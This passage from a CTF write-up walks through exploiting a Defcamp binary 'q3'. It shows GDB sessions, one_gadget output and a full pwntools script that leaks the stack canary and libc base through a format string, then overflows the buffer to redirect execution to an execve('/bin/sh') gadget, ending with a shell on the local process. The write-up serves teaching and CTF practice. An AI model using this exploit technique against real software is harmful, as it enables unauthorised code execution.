punctuation">]</span>gef➤  p <span class="token number">0x7ffff7af4154</span> <span class="token operator">-</span> <span class="token number">0x00007ffff79e4000</span><span class="token operator">$</span><span class="token number">1</span> <span class="token operator">=</span> <span class="token number">0x110154</span></code></pre><p>Using <code>vmmap</code> we get to know the address of executable and writable libc and using the address we leaked from <code>%3$lx</code> input we have the leaked libc address, we just subtracted the leak address from the <code>libc.so.6</code> address, we get the offset.</p><p>Time to find out the offsets for register so we we will create our final exploit:-</p><pre class=" language-r"><code class="language-r">gef➤  b <span class="token operator">*</span>main<span class="token operator">+</span><span class="token number">164</span>Breakpoint <span class="token number">1</span> at <span class="token number">0x81e</span>gef➤  pattern create <span class="token number">100</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Generating a pattern of <span class="token number">100</span> bytesaaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Saved as <span class="token string">'$_gef0'</span>gef➤  rStarting program<span class="token operator">:</span> <span class="token operator">/</span>home<span class="token operator">/</span>robin<span class="token operator">/</span>CTFs<span class="token operator">/</span>Defcamp<span class="token operator">/</span>q3 Enter name <span class="token operator">:</span> AAAAHelloAAAAEnter sentence <span class="token operator">:</span> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa<span class="token punctuation">[</span> Legend<span class="token operator">:</span> Modified register <span class="token operator">|</span> Code <span class="token operator">|</span> Heap <span class="token operator">|</span> Stack <span class="token operator">|</span> String <span class="token punctuation">]</span>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────<span class="token operator">$</span>rax   <span class="token operator">:</span> <span class="token number">0x0</span>               <span class="token operator">$</span>rbx   <span class="token operator">:</span> <span class="token number">0x0</span>               <span class="token operator">$</span>rcx   <span class="token operator">:</span> <span class="token number">0x6161616161616164</span> <span class="token punctuation">(</span><span class="token string">"daaaaaaa"</span>?<span class="token punctuation">)</span><span class="token operator">$</span>rdx   <span class="token operator">:</span> <span class="token number">0x00007ffff7dd18d0</span>  →  <span class="token number">0x0000000000000000</span><span class="token operator">$</span>rsp   <span class="token operator">:</span> <span class="token number">0x00007fffffffdd10</span>  →  <span class="token number">0x00007ffff7de59a0</span>  →  <span class="token operator">&lt;</span>_dl_fini<span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span> push rbp<span class="token operator">$</span>rbp   <span class="token operator">:</span> <span class="token number">0x00007fffffffdd40</span>  →  <span class="token string">"eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka[...]"</span><span class="token operator">$</span>rsi   <span class="token operator">:</span> <span class="token number">0x00007fffffffdd20</span>  →  <span class="token string">"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"</span><span class="token operator">$</span>rdi   <span class="token operator">:</span> <span class="token number">0x00007fffffffdd21</span>  →  <span class="token string">"aaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaa[...]"</span><span class="token operator">$</span>rip   <span class="token operator">:</span> <span class="token number">0x000055555555481e</span>  →  <span class="token number">0x000028250c334864</span> <span class="token punctuation">(</span>"dH3                                                        %<span class="token punctuation">(</span>"?<span class="token punctuation">)</span><span class="token operator">$</span>r8    <span class="token operator">:</span> <span class="token number">0x00005555557566d5</span>  →  <span class="token number">0x0000000000000000</span><span class="token operator">$</span>r9    <span class="token operator">:</span> <span class="token number">0x00007ffff7fd24c0</span>  →  <span class="token number">0x00007ffff7fd24c0</span>  →  <span class="token punctuation">[</span>loop detected<span class="token punctuation">]</span><span class="token operator">$</span>r10   <span class="token operator">:</span> <span class="token number">0x00007ffff7fd24c0</span>  →  <span class="token number">0x00007ffff7fd24c0</span>  →  <span class="token punctuation">[</span>loop detected<span class="token punctuation">]</span><span class="token operator">$</span>r11   <span class="token operator">:</span> <span class="token number">0x246</span>             <span class="token operator">$</span>r12   <span class="token operator">:</span> <span class="token number">0x0000555555554670</span>  →  <span class="token operator">&lt;</span>_start<span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span> xor ebp<span class="token punctuation">,</span> ebp<span class="token operator">$</span>r13   <span class="token operator">:</span> <span class="token number">0x00007fffffffde20</span>  →  <span class="token number">0x0000000000000001</span><span class="token operator">$</span>r14   <span class="token operator">:</span> <span class="token number">0x0</span>               <span class="token operator">$</span>r15   <span class="token operator">:</span> <span class="token number">0x0</span>               <span class="token operator">$</span>eflags<span class="token operator">:</span> <span class="token punctuation">[</span>ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification<span class="token punctuation">]</span><span class="token operator">$</span>cs<span class="token operator">:</span> <span class="token number">0x0033</span> <span class="token operator">$</span>ss<span class="token operator">:</span> <span class="token number">0x002b</span> <span class="token operator">$</span>ds<span class="token operator">:</span> <span class="token number">0x0000</span> <span class="token operator">$</span>es<span class="token operator">:</span> <span class="token number">0x0000</span> <span class="token operator">$</span>fs<span class="token operator">:</span> <span class="token number">0x0000</span> <span class="token operator">$</span>gs<span class="token operator">:</span> <span class="token number">0x0000</span> ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────<span class="token number">0x00007fffffffdd10</span>│<span class="token operator">+</span><span class="token number">0x0000</span><span class="token operator">:</span> <span class="token number">0x00007ffff7de59a0</span>  →  <span class="token operator">&lt;</span>_dl_fini<span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span> push rbp     ← <span class="token operator">$</span>rsp<span class="token number">0x00007fffffffdd18</span>│<span class="token operator">+</span><span class="token number">0x0008</span><span class="token operator">:</span> <span class="token number">0x00007ffff7dcfa00</span>  →  <span class="token number">0x00000000fbad2288</span><span class="token number">0x00007fffffffdd20</span>│<span class="token operator">+</span><span class="token number">0x0010</span><span class="token operator">:</span> <span class="token string">"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"</span>     ← <span class="token operator">$</span>rsi<span class="token number">0x00007fffffffdd28</span>│<span class="token operator">+</span><span class="token number">0x0018</span><span class="token operator">:</span> <span class="token string">"baaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaaha[...]"</span><span class="token number">0x00007fffffffdd30</span>│<span class="token operator">+</span><span class="token number">0x0020</span><span class="token operator">:</span> <span class="token string">"caaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaia[...]"</span><span class="token number">0x00007fffffffdd38</span>│<span class="token operator">+</span><span class="token number">0x0028</span><span class="token operator">:</span> <span class="token string">"daaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja[...]"</span><span class="token number">0x00007fffffffdd40</span>│<span class="token operator">+</span><span class="token number">0x0030</span><span class="token operator">:</span> <span class="token string">"eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka[...]"</span>     ← <span class="token operator">$</span>rbp<span class="token number">0x00007fffffffdd48</span>│<span class="token operator">+</span><span class="token number">0x0038</span><span class="token operator">:</span> <span class="token string">"faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaala[...]"</span>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code<span class="token operator">:</span>x86<span class="token operator">:</span><span class="token number">64</span> ────   <span class="token number">0x555555554810</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">150</span><span class="token operator">></span>       call   <span class="token number">0x555555554650</span> <span class="token operator">&lt;</span>fgets<span class="token operator">@</span>plt<span class="token operator">></span>   <span class="token number">0x555555554815</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">155</span><span class="token operator">></span>       mov    eax<span class="token punctuation">,</span> <span class="token number">0x0</span>   <span class="token number">0x55555555481a</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">160</span><span class="token operator">></span>       mov    rcx<span class="token punctuation">,</span> QWORD PTR <span class="token punctuation">[</span>rbp<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">]</span> → <span class="token number">0x55555555481e</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">164</span><span class="token operator">></span>       xor    rcx<span class="token punctuation">,</span> QWORD PTR fs<span class="token operator">:</span><span class="token number">0x28</span>   <span class="token number">0x555555554827</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">173</span><span class="token operator">></span>       je     <span class="token number">0x55555555482e</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">180</span><span class="token operator">></span>   <span class="token number">0x555555554829</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">175</span><span class="token operator">></span>       call   <span class="token number">0x555555554630</span> <span class="token operator">&lt;</span>__stack_chk_fail<span class="token operator">@</span>plt<span class="token operator">></span>   <span class="token number">0x55555555482e</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">180</span><span class="token operator">></span>       leave     <span class="token number">0x55555555482f</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">181</span><span class="token operator">></span>       ret       <span class="token number">0x555555554830</span> <span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">0</span><span class="token operator">></span> push   r15──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────<span class="token punctuation">[</span><span class="token comment" spellcheck="true">#0] Id 1, Name: "q3", stopped, reason: BREAKPOINT</span>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────<span class="token punctuation">[</span><span class="token comment" spellcheck="true">#0] 0x55555555481e → main()</span>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────Breakpoint <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x000055555555481e</span> <span class="token keyword">in</span> main <span class="token punctuation">(</span><span class="token punctuation">)</span>gef➤  pattern search daaaaaaa<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Searching <span class="token string">'daaaaaaa'</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Found at offset <span class="token number">17</span> <span class="token punctuation">(</span>little<span class="token operator">-</span>endian search<span class="token punctuation">)</span> likely<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Found at offset <span class="token number">24</span> <span class="token punctuation">(</span>big<span class="token operator">-</span>endian search<span class="token punctuation">)</span> gef➤  pattern search eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Searching <span class="token string">'eaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaaka'</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Found at offset <span class="token number">32</span> <span class="token punctuation">(</span>big<span class="token operator">-</span>endian search<span class="token punctuation">)</span> gef➤  p <span class="token operator">$</span>rcx<span class="token operator">$</span><span class="token number">1</span> <span class="token operator">=</span> <span class="token number">0x6161616161616164</span>   <span class="token operator">&lt;-</span><span class="token operator">-</span><span class="token operator">-</span> Canary value overwrtten</code></pre><p>As you can see we have overwritten the canary and we have the <code>rcx</code> register offset and we have <code>rbp</code> register offset at 32 which would be <code>32 - 24 = 8</code>. </p><h3 id="One-gadget-The-best-tool-for-finding-one-gadget-RCE-in-libc-so-6"><a href="#One-gadget-The-best-tool-for-finding-one-gadget-RCE-in-libc-so-6" class="headerlink" title="One_gadget - The best tool for finding one gadget RCE in libc.so.6"></a>One_gadget - The best tool for finding one gadget RCE in libc.so.6</h3><p>I can honsetly vouch for this tool, this was the first time I used it and it’s just awesome. With this tool it was easier to find the gadgets for shell spwaning.</p><pre class=" language-r"><code class="language-r">robin<span class="token operator">@</span>oracle<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>CTFs<span class="token operator">/</span>Defcamp<span class="token operator">$</span> ldd q3    linux<span class="token operator">-</span>vdso.so<span class="token number">.1</span> <span class="token punctuation">(</span><span class="token number">0x00007ffff7ffa000</span><span class="token punctuation">)</span>    libc.so<span class="token number">.6</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc.so<span class="token number">.6</span> <span class="token punctuation">(</span><span class="token number">0x00007ffff77e2000</span><span class="token punctuation">)</span>    <span class="token operator">/</span>lib64<span class="token operator">/</span>ld<span class="token operator">-</span>linux<span class="token operator">-</span>x86<span class="token operator">-</span><span class="token number">64</span>.so<span class="token number">.2</span> <span class="token punctuation">(</span><span class="token number">0x00007ffff7dd5000</span><span class="token punctuation">)</span>robin<span class="token operator">@</span>oracle<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>CTFs<span class="token operator">/</span>Defcamp<span class="token operator">$</span> one_gadget <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc.so<span class="token number">.6</span><span class="token number">0x4f2c5</span> execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token operator">:</span>  rcx <span class="token operator">==</span> <span class="token keyword">NULL</span><span class="token number">0x4f322</span> execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token operator">:</span>  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">NULL</span><span class="token number">0x10a38c</span> execve<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>constraints<span class="token operator">:</span>  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword">NULL</span></code></pre><p>I’ll be using the first one <code>0x4f2c5</code>. Now, it’s time to pwn:-</p><h3 id="Final-Exploit"><a href="#Final-Exploit" class="headerlink" title="Final Exploit"></a>Final Exploit</h3><p>We have almost everything, now it’s time for final exploit:-</p><p>Here’s the idea, I’ll be using the format string specifier to leak canary and libc address and then use the stack canary value to send the payload and using the libc address offset we will get the one_gadget address and we are done.</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python2</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true"># stack canary is at offset 11 for format string</span><span class="token comment" spellcheck="true"># It is at offset 24 for buffer overflow</span>BINARY <span class="token operator">=</span> <span class="token string">'./q3'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>BINARY<span class="token punctuation">)</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libcp <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./q3"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Leak stack canary (offset 11) and the libc address (offset 3)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'%11$lx-%3$lx'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>leaks <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>stack_canary <span class="token operator">=</span> int<span class="token punctuation">(</span>leaks<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Stack Canary</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> int<span class="token punctuation">(</span>leaks<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x110154</span>  <span class="token comment" spellcheck="true"># LIBC offset we found earlier </span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'canary: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>stack_canary<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'libc base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x4f2c5</span> <span class="token comment" spellcheck="true"># using one_gadget </span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'one_gadget: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">24</span> <span class="token comment" spellcheck="true"># Write up to the stack canary</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>stack_canary<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Ensure we don't change the stack canary</span>payload <span class="token operator">+=</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token comment" spellcheck="true"># Overwrite RBP to reach upto RIP</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Overwrite RIP with pre-made shell</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>Running the exploit we will get shell:-</p><pre class=" language-r"><code class="language-r">robin<span class="token operator">@</span>oracle<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>CTFs<span class="token operator">/</span>Defcamp<span class="token operator">$</span> python q3_exp.py <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/robin/CTFs/Defcamp/q3'</span>    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Full RELRO    Stack<span class="token operator">:</span>    Canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      PIE enabled<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span>    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    Canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      PIE enabled<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting local process <span class="token string">'./q3'</span><span class="token operator">:</span> pid <span class="token number">9550</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> canary<span class="token operator">:</span> <span class="token number">0x648678ab45c48e00</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> libc base<span class="token operator">:</span> <span class="token number">0x7ffff79e4000</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> one_gadget<span class="token operator">:</span> <span class="token number">0x7ffff7a332c5</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode<span class="token operator">$</span> lscore                 libc.so<span class="token number">.6</span>       q3_exp.py  q3.til<span class="token operator">$</span> <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Interrupted<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Stopped process <span class="token string">'./q3'</span> <span class="token punctuation">(</span>pid <span class="token number">9550</span><span class="token punctuation">)</span></code></pre><p>That was it folks, took more than I thought it would but we made it.</p><p>I hope you enjoyed it and learned something today. If you encountered any problem or anything relevant contact me on <a href="https://twitter.com/d4mianwayne" target="_blank" rel="noopener">twitter</a></p>]]></content>
      
      
      <categories>
          
          <category> Binary Exploitation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn, fmtstr, bof </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
